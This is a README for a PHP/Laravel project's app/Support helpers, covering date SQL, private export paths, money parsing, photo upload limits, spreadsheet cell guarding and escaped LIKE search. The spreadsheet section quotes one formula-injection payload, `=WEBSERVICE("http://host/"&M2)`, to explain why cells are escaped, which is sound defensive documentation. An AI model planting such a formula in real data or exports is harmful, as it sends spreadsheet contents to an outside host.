# app/Support

Small, stateless helpers that exist because two or more layers need to make the same decision the same way. Nothing here knows about HTTP, Eloquent models or the container — each class answers one question (`"what SQL does this driver need?"`, `"what is the configured photo limit?"`, `"is this cell safe to hand to Excel?"`).

> **New to programming?** See [NON_TECHNICAL_PROJECT_GUIDE.md](../../NON_TECHNICAL_PROJECT_GUIDE.md) — think of this folder as the ruler and the level: not part of any wall, but every wall is measured with it.

## Overview

A class belongs here when:
- it is `final` with only `static` methods and no injected dependencies, **and**
- the alternative is copying the same rule into a repository, a service and a controller.

Rules that would otherwise drift between layers are read from `config()` inside these helpers, so the environment stays the single place to change them. Unit tests live in `tests/Unit/Support/`.

---

## Files

### `DateSql.php`

**File:** [`app/Support/DateSql.php`](DateSql.php)

**What it answers:** "Which SQL expression does *this* driver need to group a timestamp by month, or subtract two timestamps in minutes?"

- `month(string $column): string` (`:24`) — `YYYY-MM` key: `strftime()` on SQLite, `to_char()` on PostgreSQL, `DATE_FORMAT()` elsewhere.
- `minutesBetween(string $from, string $to): string` (`:36`) — signed minute difference between two timestamp columns.

**Who uses it:** `app/Domain/Ticket/Queries/MonthlyTicketsQuery.php`, `app/Domain/Ticket/Queries/TicketKpiQuery.php` and `AnalyticsDashboardService::monthlyPerformanceData()`.

**Why it is not inline:** the analytics KPIs are the only place the project needs month buckets and durations, and a `strftime()` call written in a query breaks the moment staging moves to PostgreSQL. Column names come from code, never from a request.

---

### `ExportArtifact.php`

**File:** [`app/Support/ExportArtifact.php`](ExportArtifact.php)

**What it answers:** "Where does a generated report go, what may it be called, and how is it linked?"

- `FILENAME_PATTERN` (`:25`) — `[A-Za-z0-9_-]+\.(csv|xlsx|pdf)`, used both as the route constraint and by `isSafeFilename()` so the two cannot disagree.
- `DISK` (`:27`) — `local`, the **private** disk. Reports used to land on the public disk with a clock-built name, which made `/storage/exports/…` downloadable by anyone who could guess a minute.
- `path(int $userId, string $slug, string $extension): string` (`:32`) — `exports/{userId}/{slug}-{Ymd_His}-{24 random chars}.{ext}`; the random suffix is what stops two exports in the same second from overwriting each other.
- `link(string $relativePath): string` (`:48`) — URL of the authorized download route, `/exports/{userId}/{filename}`.
- `filename()` / `userId()` (`:53`, `:61`) — pull the two path segments back out; `userId()` is what the controller compares against the caller.
- `isSafeFilename(string $filename): bool` (`:66`) — the pattern, anchored at both ends.

**Who uses it:** the export jobs (`ExportCsvJob`, `ExportExcelJob`, `ExportPdfJob`, `ExportEquipmentQrPdfJob`, `ExportStockCostsPdfJob`), `ExportDownloadController`, `PruneExports`, and the route constraint in `routes/web.php`.

---

### `MoneyInput.php`

**File:** [`app/Support/MoneyInput.php`](MoneyInput.php)

**What it answers:** "A human typed an amount — what float did they mean?"

- `parse(mixed $value): float` (`:21`) — strips everything but digits, separators and sign, then resolves the notation: when both `,` and `.` appear the **rightmost** one is the decimal separator and the other groups thousands; when a single separator repeats (`1.500.000`, `12,345,678`) it is grouping, not a decimal point; a lone `,` becomes the decimal point. Result rounded to 2 decimals; anything unparseable becomes `0.0`.

`'1.500'` stays genuinely ambiguous — 1500 in pt-PT, 1.5 in en — and is read as a decimal separator, which is what the `type="number"` inputs and API clients actually send. That ambiguity is documented in the class docblock rather than hidden, because the same amount typed through different paths must not silently disagree.

**Who uses it:** `app/DTOs/BudgetSubmissionData.php` and `app/DTOs/CloseTicketData.php` — every estimate the workflow stores.

**Tests:** `tests/Unit/Support/MoneyInputTest.php` (data provider over both notations).

---

### `PhotoUploadPolicy.php`

**File:** [`app/Support/PhotoUploadPolicy.php`](PhotoUploadPolicy.php)

**What it answers:** "What may a ticket photo be, and what do we call it on disk?"

- `allowedTypes(): list<string>` (`:50`) — `services.custom.upload.allowed_photo_mimes`, trimmed, lower-cased, de-duplicated; falls back to `jpeg, jpg, png, gif, webp` when the list is empty or not an array.
- `maxSizeKb()` / `maxWidth()` / `maxHeight()` (`:69`, `:74`, `:79`) — the configured limits, with `2048 KB` / `4096 px` fallbacks whenever a value is missing, zero, negative or non-numeric, so a bad `.env` cannot disable validation.
- `extensionFor(string $mimeType): string` (`:90`) — extension for the **detected** MIME (never the client-supplied name): a known table for jpeg/png/gif/webp/bmp/tiff/avif/heic/heif, the sanitized subtype for any other `image/*`, and a neutral `img` for anything else. It never returns null, so a file that passed validation is always stored — silently discarding a reporter's photo was the defect this replaced.

**Who uses it:** `UploadPhotoRequest` and `PublicStoreTicketRequest` build their rules from it; `TicketAttachmentController::store()` and `PublicTicketController::storePhoto()` name the file with it; `PublicTicketController::create()` derives the form's `accept` attribute, so the picker cannot offer a type the server would refuse.

**Why one place:** the public QR form used to hardcode `4096` KB while the authenticated upload used the configured `2048`, and each controller kept its own MIME table — so the same photo behaved differently depending on which door it came through.

**Tests:** `tests/Unit/Support/PhotoUploadPolicyTest.php`, plus the public-form cases in `tests/Feature/API/Controllers/PublicTicketFeatureTest.php`.

---

### `SpreadsheetCell.php`

**File:** [`app/Support/SpreadsheetCell.php`](SpreadsheetCell.php)

**What it answers:** "Would a spreadsheet execute this cell?"

- `guard(?string $value): string` (`:23`) — prefixes `'` when the left-trimmed text starts with `=`, `+`, `-`, `@`, tab or newline. Numbers keep their sign: a negative amount legitimately starts with `-`, so only text cells go through here.

**Who uses it:** `app/Exports/TicketsExport.php`, `AnalyticsExportService`, `StockReportController`. A ticket title such as `=WEBSERVICE("http://host/"&M2)` exfiltrates the rest of the sheet as soon as an admin opens the export, which is why the guard sits next to the writer, not next to the input.

---

### `SqlPattern.php`

**File:** [`app/Support/SqlPattern.php`](SqlPattern.php)

**What it answers:** "How do I search text without the driver or a wildcard betraying me?"

- `whereContains(Builder $query, array $columns, string $term): void` (`:34`) — adds one bracketed `OR` group across the given columns.
  - `ilike` on PostgreSQL, `like` elsewhere (LIKE is case-insensitive on SQLite/MySQL, case-sensitive on PostgreSQL).
  - Escapes `!`, `%` and `_` in the term and emits an explicit `ESCAPE '!'` clause; a backslash escape — the usual recipe — matches nothing on SQLite, which has no default escape character.
  - `assertIdentifier()` (`:63`) accepts only plain or `table.column` identifiers and throws otherwise, because column names are interpolated into raw SQL while the term is always bound.

**Who uses it:** `TicketSearchService`, `EquipmentRepository`, `UserRepository`, `EquipmentService`, `PartService`, `SupplierController`.
